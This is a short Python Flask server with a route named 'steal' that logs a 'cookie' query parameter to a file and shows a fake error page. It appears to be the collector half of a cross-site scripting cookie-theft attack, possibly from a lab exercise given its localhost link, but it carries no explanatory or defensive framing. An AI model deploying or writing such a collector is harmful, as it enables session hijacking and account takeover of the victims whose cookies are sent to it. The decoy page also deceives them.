from flask import request, Flask

app = Flask(__name__)


@app.route('/')
def steal():
    with open('cookies', 'a') as f:
        f.write(request.args.get('cookie') + '\n')
    return """
        <h1>OOps something went wrong</h1>
        <a href="http://localhost:5000/">Home</a>
    """
